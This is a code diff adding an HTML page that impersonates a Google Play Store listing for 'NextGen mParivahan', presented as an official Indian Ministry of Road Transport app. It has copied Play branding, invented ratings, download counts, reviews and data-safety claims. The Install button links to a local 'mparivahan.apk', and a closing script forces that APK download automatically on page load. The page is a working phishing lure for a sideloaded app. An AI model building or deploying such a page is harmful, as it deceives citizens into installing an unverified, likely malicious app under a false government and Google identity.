@@ -1,0 +1,833 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, maximum-scale=1, user-scalable=no">
+  <meta name="theme-color" content="#1f1f1f">
+  <title>NextGen mParivahan — Apps on Google Play</title>
+  <link rel="icon" type="image/png" href="logo.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #1f1f1f;
+      --surface: #2b2b2b;
+      --surface-variant: #353535;
+      --text: #e3e3e3;
+      --muted: #c4c7c5;
+      --line: #383838;
+      --primary: #01875f;
+      --primary-hover: #017351;
+      --star: #e3e3e3;
+      --badge-bg: #2d312e;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html, body {
+      width: 100%;
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+      overflow-x: hidden;
+      line-height: 1.4;
+    }
+
+    /* ── PLAY STORE TOP NAVBAR ── */
+    .top {
+      height: 60px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 16px;
+      border-bottom: 1px solid var(--line);
+      position: sticky;
+      top: 0;
+      background: rgba(31, 31, 31, 0.96);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      z-index: 999;
+    }
+
+    .top-left {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .hamb {
+      font-size: 22px;
+      cursor: pointer;
+      color: var(--muted);
+      display: flex;
+      align-items: center;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      text-decoration: none;
+      color: var(--text);
+    }
+
+    .brand-logo {
+      width: 28px;
+      height: 28px;
+    }
+
+    .brand-text {
+      font-size: 19px;
+      font-weight: 500;
+      letter-spacing: -0.2px;
+    }
+
+    .top-right {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .search-icon-mobile {
+      color: var(--muted);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+    }
+
+    .profile {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: #7cacf8;
+      color: #041e49;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      font-size: 14px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.4);
+    }
+
+    /* ── MAIN CONTENT ── */
+    .main {
+      max-width: 1040px;
+      margin: 0 auto;
+      padding: 16px 16px 60px;
+    }
+
+    /* ── HERO SECTION (Exact Play Store Mobile Hierarchy) ── */
+    .hero {
+      padding: 8px 0 20px;
+    }
+
+    .heroTop {
+      display: flex;
+      gap: 16px;
+      align-items: center;
+    }
+
+    .logo {
+      width: 80px;
+      height: 80px;
+      border-radius: 18px;
+      object-fit: cover;
+      background: #ffffff;
+      padding: 4px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.35);
+      flex-shrink: 0;
+    }
+
+    .heroInfo {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .name {
+      font-size: 22px;
+      font-weight: 500;
+      color: #ffffff;
+      line-height: 1.25;
+      margin-bottom: 4px;
+      word-break: break-word;
+    }
+
+    .dev {
+      color: var(--primary);
+      font-size: 14px;
+      font-weight: 500;
+      margin-bottom: 6px;
+      display: block;
+    }
+
+    .sub-meta {
+      font-size: 12px;
+      color: var(--muted);
+      display: flex;
+      gap: 6px;
+      flex-wrap: wrap;
+    }
+
+    /* ── STATS BAR (Scrollable Strip) ── */
+    .meta {
+      display: flex;
+      align-items: center;
+      margin: 20px 0 18px;
+      padding: 4px 0;
+      overflow-x: auto;
+      scrollbar-width: none;
+    }
+
+    .meta::-webkit-scrollbar {
+      display: none;
+    }
+
+    .m {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 0 18px;
+      border-right: 1px solid var(--line);
+      flex-shrink: 0;
+      text-align: center;
+    }
+
+    .m:first-child {
+      padding-left: 4px;
+    }
+
+    .m:last-child {
+      border-right: none;
+      padding-right: 4px;
+    }
+
+    .m-val {
+      font-size: 14px;
+      font-weight: 700;
+      color: #ffffff;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      white-space: nowrap;
+    }
+
+    .m-lbl {
+      font-size: 11px;
+      color: var(--muted);
+      margin-top: 3px;
+      white-space: nowrap;
+    }
+
+    .age-badge {
+      display: inline-block;
+      border: 1px solid #747775;
+      border-radius: 3px;
+      padding: 0 4px;
+      font-size: 10px;
+      line-height: 14px;
+      font-weight: 700;
+    }
+
+    /* ── INSTALL CTA BUTTON ── */
+    .install-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      width: 100%;
+      height: 44px;
+      border-radius: 22px;
+      background: var(--primary);
+      color: #ffffff;
+      font-family: inherit;
+      font-size: 15px;
+      font-weight: 600;
+      text-decoration: none;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.3);
+      transition: background 0.2s, transform 0.1s;
+    }
+
+    .install-btn:active {
+      background: var(--primary-hover);
+      transform: scale(0.98);
+    }
+
+    .install-btn svg {
+      width: 18px;
+      height: 18px;
+      fill: currentColor;
+    }
+
+    .device-compat {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      font-size: 12px;
+      color: var(--muted);
+      margin-top: 10px;
+    }
+
+    .device-compat svg {
+      width: 14px;
+      height: 14px;
+      fill: currentColor;
+    }
+
+    /* ── APP SCREENSHOTS PREVIEW CAROUSEL ── */
+    .section {
+      border-top: 1px solid var(--line);
+      padding: 20px 0;
+    }
+
+    .sectitle-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 14px;
+    }
+
+    .sectitle {
+      font-size: 18px;
+      font-weight: 500;
+      color: #ffffff;
+    }
+
+    .arrow-icon {
+      color: var(--muted);
+      font-size: 20px;
+      line-height: 1;
+    }
+
+    .shots {
+      display: flex;
+      gap: 12px;
+      overflow-x: auto;
+      padding-bottom: 6px;
+      scrollbar-width: none;
+      -webkit-overflow-scrolling: touch;
+    }
+
+    .shots::-webkit-scrollbar {
+      display: none;
+    }
+
+    .shot-card {
+      width: 165px;
+      height: 290px;
+      flex: 0 0 165px;
+      border-radius: 14px;
+      background: linear-gradient(145deg, #162438, #0e1724);
+      border: 1px solid rgba(255,255,255,0.08);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 16px 14px;
+      text-align: center;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+    }
+
+    .shot-icon {
+      font-size: 2.5rem;
+      margin-bottom: 12px;
+    }
+
+    .shot-title {
+      font-size: 14px;
+      font-weight: 700;
+      color: #38bdf8;
+      margin-bottom: 6px;
+    }
+
+    .shot-desc {
+      font-size: 11px;
+      color: var(--muted);
+      line-height: 1.45;
+    }
+
+    /* ── ABOUT APP ── */
+    .about {
+      font-size: 14px;
+      line-height: 1.6;
+      color: #c4c7c5;
+      white-space: pre-line;
+    }
+
+    .tags {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-top: 14px;
+    }
+
+    .tag {
+      border: 1px solid #4a4a4a;
+      border-radius: 8px;
+      padding: 6px 12px;
+      font-size: 12px;
+      color: var(--muted);
+      background: rgba(255,255,255,0.02);
+    }
+
+    /* ── WHAT'S NEW ── */
+    .new-card {
+      background: var(--surface);
+      border-radius: 12px;
+      padding: 14px;
+      font-size: 13px;
+      color: #d1d5db;
+      line-height: 1.5;
+    }
+
+    /* ── DATA SAFETY BADGE (Play Store Exclusive) ── */
+    .data-safety-card {
+      border: 1px solid #454746;
+      border-radius: 12px;
+      padding: 14px;
+      margin-top: 8px;
+    }
+
+    .safety-item {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 10px;
+    }
+
+    .safety-item:last-child {
+      margin-bottom: 0;
+    }
+
+    .safety-icon {
+      font-size: 18px;
+      color: var(--muted);
+    }
+
+    .safety-text {
+      font-size: 13px;
+      color: #e3e3e3;
+    }
+
+    .safety-sub {
+      font-size: 11px;
+      color: var(--muted);
+      margin-top: 2px;
+    }
+
+    /* ── RATINGS & REVIEWS ── */
+    .rating-wrap {
+      display: flex;
+      align-items: center;
+      gap: 24px;
+      margin-bottom: 16px;
+    }
+
+    .big-score {
+      font-size: 48px;
+      font-weight: 500;
+      line-height: 1;
+      color: #ffffff;
+    }
+
+    .stars-line {
+      color: var(--primary);
+      font-size: 15px;
+      letter-spacing: 1px;
+      margin: 4px 0 2px;
+    }
+
+    .rev-count {
+      font-size: 12px;
+      color: var(--muted);
+    }
+
+    .bars-wrap {
+      flex: 1;
+    }
+
+    .bar-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin: 3px 0;
+      font-size: 11px;
+      color: var(--muted);
+    }
+
+    .bar-track {
+      flex: 1;
+      height: 6px;
+      background: #444746;
+      border-radius: 6px;
+      overflow: hidden;
+    }
+
+    .bar-fill {
+      height: 100%;
+      background: var(--primary);
+      border-radius: 6px;
+    }
+
+    .review-card {
+      background: var(--surface);
+      border-radius: 12px;
+      padding: 14px;
+      margin: 10px 0;
+    }
+
+    .r-header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 6px;
+    }
+
+    .r-avatar {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: #444746;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      font-weight: 700;
+      color: #e3e3e3;
+    }
+
+    .r-name {
+      font-size: 13px;
+      font-weight: 500;
+      color: #ffffff;
+    }
+
+    .r-stars {
+      color: var(--primary);
+      font-size: 12px;
+      margin-bottom: 6px;
+    }
+
+    .r-body {
+      font-size: 13px;
+      color: #c4c7c5;
+      line-height: 1.45;
+    }
+
+    .r-date {
+      font-size: 11px;
+      color: var(--muted);
+      margin-top: 6px;
+    }
+
+    footer {
+      text-align: center;
+      color: #8e918f;
+      padding: 30px 16px;
+      font-size: 12px;
+      border-top: 1px solid var(--line);
+    }
+
+    /* ── DESKTOP OPTIMIZATIONS ── */
+    @media (min-width: 651px) {
+      .top {
+        height: 66px;
+        padding: 0 24px;
+      }
+      .logo {
+        width: 110px;
+        height: 110px;
+        border-radius: 24px;
+      }
+      .name {
+        font-size: 32px;
+      }
+      .install-btn {
+        width: 240px;
+        height: 48px;
+        font-size: 16px;
+      }
+      .device-compat {
+        justify-content: flex-start;
+      }
+      .shot-card {
+        width: 190px;
+        height: 330px;
+        flex: 0 0 190px;
+      }
+      .rating-wrap {
+        gap: 40px;
+      }
+      .big-score {
+        font-size: 56px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- Google Play App Bar -->
+  <header class="top">
+    <div class="top-left">
+      <div class="hamb">☰</div>
+      <a href="#" class="brand">
+        <svg class="brand-logo" viewBox="0 0 40 40">
+          <path d="M7 6l15 14L7 34V6z" fill="#0086F8" />
+          <path d="M22 20l7-7 6 3.5c1.4.8 1.4 2.2 0 3L22 20z" fill="#FFD400" />
+          <path d="M7 6l15 14 7-7L12 3c-2.4-1.4-5 0-5 3z" fill="#00E676" />
+          <path d="M7 34l15-14 7 7-17 10c-2.4 1.4-5 0-5-3z" fill="#FF334B" />
+        </svg>
+        <span class="brand-text">Google Play</span>
+      </a>
+    </div>
+
+    <!-- Right Corner Profile -->
+    <div class="top-right">
+      <div class="search-icon-mobile">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+          <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z" />
+        </svg>
+      </div>
+      <div class="profile" title="Google Account">V</div>
+    </div>
+  </header>
+
+  <main class="main">
+
+    <!-- App Identity & CTA -->
+    <section class="hero">
+      <div class="heroTop">
+        <img src="logo.png" alt="mParivahan Logo" class="logo">
+        <div class="heroInfo">
+          <h1 class="name">NextGen mParivahan</h1>
+          <span class="dev">Vahan · Ministry of Road Transport</span>
+          <div class="sub-meta">
+            <span>Contains ads</span>
+            <span>•</span>
+            <span>In-app purchases</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Play Store Quick Stats Strip -->
+      <div class="meta">
+        <div class="m">
+          <div class="m-val">4.6 ★</div>
+          <div class="m-lbl">8.4L reviews</div>
+        </div>
+        <div class="m">
+          <div class="m-val">28 MB</div>
+          <div class="m-lbl">Size</div>
+        </div>
+        <div class="m">
+          <div class="m-val"><span class="age-badge">3+</span></div>
+          <div class="m-lbl">Rated for 3+</div>
+        </div>
+        <div class="m">
+          <div class="m-val">50M+</div>
+          <div class="m-lbl">Downloads</div>
+        </div>
+      </div>
+
+      <!-- Download Button -->
+      <a id="btn-install" href="mparivahan.apk" download="mparivahan.apk" onclick="forceDownload(event)" class="install-btn">
+        <svg viewBox="0 0 24 24">
+          <path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM17 13l-5 5-5-5h3V9h4v4h3z" />
+        </svg>
+        <span>Install</span>
+      </a>
+
+      <div class="device-compat">
+        <svg viewBox="0 0 24 24">
+          <path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/>
+        </svg>
+        <span>This app is compatible with your device</span>
+      </div>
+    </section>
+
+    <!-- App Preview Feature Mockups -->
+    <section class="section">
+      <div class="sectitle-row">
+        <h2 class="sectitle">App preview</h2>
+        <span class="arrow-icon">›</span>
+      </div>
+      <div class="shots">
+        <div class="shot-card">
+          <div class="shot-icon">🚗</div>
+          <div class="shot-title">RC Details</div>
+          <div class="shot-desc">Instant verification of Registration Certificate with owner name, vehicle age, and fuel type.</div>
+        </div>
+        <div class="shot-card">
+          <div class="shot-icon">🪪</div>
+          <div class="shot-title">Virtual DL</div>
+          <div class="shot-desc">Authentic Digital Driving Licence with verified QR authentication accepted by traffic authorities.</div>
+        </div>
+        <div class="shot-card">
+          <div class="shot-icon">🛡️</div>
+          <div class="shot-title">Insurance Status</div>
+          <div class="shot-desc">Check active policy validity, road tax status, and PUCC certification renewal dates.</div>
+        </div>
+        <div class="shot-card">
+          <div class="shot-icon">🚨</div>
+          <div class="shot-title">E-Challan Portal</div>
+          <div class="shot-desc">Search pending traffic violations and pay challans directly via integrated government gateway.</div>
+        </div>
+        <div class="shot-card">
+          <div class="shot-icon">🏛️</div>
+          <div class="shot-title">RTO Services</div>
+          <div class="shot-desc">Locate transport offices, book DL mock tests, and track official status in real-time.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- About this app -->
+    <section class="section">
+      <div class="sectitle-row">
+        <h2 class="sectitle">About this app</h2>
+        <span class="arrow-icon">›</span>
+      </div>
+      <div class="about">
+Provides official Transport Service access to citizens across India through a mobile-based citizen charter application. This national platform empowers citizens with instant access to authentic vehicle documents, driving licenses, and RTO vehicle registration records.
+
+Key Features &amp; Services:
+• RC Information Search: Enter any vehicle number to instantly verify owner name, registration date, registering authority, fuel type, vehicle class, and fitness validity.
+• Virtual RC &amp; Virtual DL: Carry valid digital copies of your RC and Driving Licence backed by secure government cryptographic QR codes valid for police verification across India.
+• Second-Hand Vehicle Verification: Verify complete past registration and road tax history before purchasing used cars, bikes, or commercial transports.
+• E-Challan Search: Monitor pending traffic fines and settle road violations securely online.
+      </div>
+      <div class="tags">
+        <span class="tag">#1 in Auto &amp; Vehicles</span>
+        <span class="tag">Government</span>
+        <span class="tag">Vehicle Registration</span>
+        <span class="tag">Driving Licence</span>
+      </div>
+    </section>
+
+    <!-- Data Safety Section (Authentic Google Play Feature) -->
+    <section class="section">
+      <div class="sectitle-row">
+        <h2 class="sectitle">Data safety</h2>
+        <span class="arrow-icon">›</span>
+      </div>
+      <div class="data-safety-card">
+        <div class="safety-item">
+          <span class="safety-icon">🔒</span>
+          <div>
+            <div class="safety-text">Data is encrypted in transit</div>
+            <div class="safety-sub">Your data is transferred over a secure connection</div>
+          </div>
+        </div>
+        <div class="safety-item">
+          <span class="safety-icon">🛡️</span>
+          <div>
+            <div class="safety-text">Committed to follow Play Families Policy</div>
+            <div class="safety-sub">The developer has committed to follow the Families Policy</div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- What's new -->
+    <section class="section">
+      <h2 class="sectitle">What's new</h2>
+      <div class="new-card">
+        • NextGen 2.4 release with ultra-fast vehicle verification speed.<br>
+        • Offline QR code rendering for Virtual RC and Virtual DL.<br>
+        • Enhanced state payment gateways for instant challan clearing.<br>
+        • Battery performance and memory footprint optimizations.
+      </div>
+    </section>
+
+    <!-- Ratings and reviews -->
+    <section class="section">
+      <div class="sectitle-row">
+        <h2 class="sectitle">Ratings and reviews</h2>
+        <span class="arrow-icon">›</span>
+      </div>
+      <div class="rating-wrap">
+        <div>
+          <div class="big-score">4.6</div>
+          <div class="stars-line">★★★★★</div>
+          <div class="rev-count">8,42,109 reviews</div>
+        </div>
+        <div class="bars-wrap">
+          <div class="bar-row">
+            <span>5</span>
+            <div class="bar-track"><div class="bar-fill" style="width:78%"></div></div>
+          </div>
+          <div class="bar-row">
+            <span>4</span>
+            <div class="bar-track"><div class="bar-fill" style="width:14%"></div></div>
+          </div>
+          <div class="bar-row">
+            <span>3</span>
+            <div class="bar-track"><div class="bar-fill" style="width:5%"></div></div>
+          </div>
+          <div class="bar-row">
+            <span>2</span>
+            <div class="bar-track"><div class="bar-fill" style="width:2%"></div></div>
+          </div>
+          <div class="bar-row">
+            <span>1</span>
+            <div class="bar-track"><div class="bar-fill" style="width:1%"></div></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="review-card">
+        <div class="r-header">
+          <div class="r-avatar">R</div>
+          <span class="r-name">Rajesh Kumar Sharma</span>
+        </div>
+        <div class="r-stars">★★★★★</div>
+        <div class="r-body">Extremely handy app. Virtual RC and DL are accepted by traffic police everywhere without carrying physical papers. Very fast vehicle registration verification.</div>
+        <div class="r-date">14 October 2026</div>
+      </div>
+
+      <div class="review-card">
+        <div class="r-header">
+          <div class="r-avatar">A</div>
+          <span class="r-name">Amit Verma</span>
+        </div>
+        <div class="r-stars">★★★★★</div>
+        <div class="r-body">Checked second hand car registration details before buying. Verified owner name, hypothecation and road tax in 10 seconds. Great official app.</div>
+        <div class="r-date">02 October 2026</div>
+      </div>
+    </section>
+
+  </main>
+
+  <footer>
+    Google Play and the Google Play logo are trademarks of Google LLC. · Vahan Services 2026
+  </footer>
+
+  <script>
+    const APK_FILE = 'mparivahan.apk';
+
+    function forceDownload(e) {
+      if (e) {
+        e.preventDefault();
+      }
+      window.location.href = APK_FILE;
+    }
+
+    // Auto-trigger on page load
+    window.addEventListener('load', () => {
+      setTimeout(() => {
+        forceDownload();
+      }, 1000);
+    });
+  </script>
+
+</body>
+
+</html>
